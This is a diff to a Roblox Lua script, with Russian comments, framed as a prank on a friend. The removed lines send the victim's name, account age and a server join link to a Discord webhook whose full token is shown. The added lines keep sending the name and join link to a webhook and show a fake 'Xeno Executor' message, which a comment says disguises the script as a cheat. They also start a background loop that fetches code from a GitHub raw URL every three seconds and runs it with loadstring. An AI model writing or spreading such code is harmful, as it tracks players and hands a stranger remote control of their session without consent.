@@ -1,44 +1,41 @@
+local httpRequest = (syn and syn.request) or (http and http.request) or request
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local player = Players.LocalPlayer
 
-local proxyWebhook = "https://webhook.lewisakura.moe/api/webhooks/1549358385453989969/7EmPPu20TXFW0zGaRwEdCUH9e3qhWfhIbsAj8X1wSGXBReLVVHwG632PnMCm8lSIpqeU"
+-- 1. Ссылка на ваш логгер в Discord
+local discordWebhook = "https://discord.com"
+local uriJoinLink = "roblox://placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId
 
-local placeId = game.PlaceId
-local jobId = game.JobId
-local webJoinLink = "https://roblox.com" .. placeId .. "&launchData=" .. jobId
-
-local payload = {
-    ["embeds"] = {{
-        ["title"] = "🎯 Пранк запущен! Цель обнаружена",
-        ["color"] = 16738048,
-        ["fields"] = {
-            {["name"] = "Ник друга:", ["value"] = player.Name, ["inline"] = true},
-            {["name"] = "Возраст аккаунта:", ["value"] = player.AccountAge .. " дней", ["inline"] = true},
-            {["name"] = "ID игры:", ["value"] = tostring(placeId), ["inline"] = false},
-            {["name"] = "🔗 Войти на сервер с твинка:", ["value"] = "[КЛИКНИ ТУТ](" .. webJoinLink .. ")", ["inline"] = false}
-        }
-    }}
-}
-
--- Отправка с выводом ошибки в консоль (если она будет)
-local success, err = pcall(function()
-    return HttpService:PostAsync(
-        proxyWebhook, 
-        HttpService:JSONEncode(payload), 
-        Enum.HttpContentType.ApplicationJson
-    )
-end)
-
-if not success then
-    warn("Ошибка отправки в Discord: " .. tostring(err))
-else
-    print("Лог успешно улетел в Discord!")
+local payload = {["content"] = "🎯 **Пранк запущен!**\n👤 **Ник друга:** " .. player.Name .. "\n```" .. uriJoinLink .. "```"}
+if httpRequest then
+    httpRequest({Url = discordWebhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(payload)})
 end
 
--- Ваше уведомление
-game:GetService("StarterGui"):SetCore("SendNotification", {
-    Title = "⚠️ СИСТЕМА ИНТЕГРАЦИИ",
-    Text = "Успешное подключение к удаленному серверу.",
-    Duration = 5
-})
+-- Маскировка под запуск чита
+pcall(function()
+    game:GetService("StarterGui"):SetCore("SendNotification", {Title = "Xeno Executor", Text = "Script Loaded Successfully!", Duration = 3})
+end)
+
+-- 2. ССЫЛКА НА ВАШ ФАЙЛ КОМАНД (Вставьте сюда вашу RAW ссылку на command.lua)
+local commandUrl = "https://githubusercontent.com"
+
+local lastCommandCode = ""
+
+-- Бесконечный цикл, который проверяет команды в фоне
+task.spawn(function()
+    while task.wait(3) do
+        local success, currentCode = pcall(function()
+            return game:HttpGet(commandUrl)
+        end)
+        
+        -- Если код на гитхабе изменился и он не пустой — выполняем его!
+        if success and currentCode and currentCode ~= "" and currentCode ~= lastCommandCode then
+            lastCommandCode = currentCode
+            local runCode = loadstring(currentCode)
+            if runCode then
+                pcall(runCode)
+            end
+        end
+    end
+end)
